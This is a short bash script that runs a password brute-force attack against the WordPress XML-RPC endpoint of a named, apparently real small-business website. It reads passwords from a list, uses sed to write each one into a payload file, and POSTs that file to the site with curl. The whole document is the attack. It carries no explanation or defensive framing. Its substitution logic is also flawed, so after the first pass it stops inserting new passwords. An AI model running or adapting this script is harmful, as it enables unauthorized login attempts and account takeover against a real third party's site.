#! /usr/bin/bash
filename="passlist.txt"
while read -r line; do
    name="$line"
    echo "Trying password - $name"

    sed -i "s/password/$name/g" ./list/*
    curl https://diaztreeandlawnservice.com/xmlrpc.php -d@./list/payload.xml
    #sleep 2

done < "$filename"
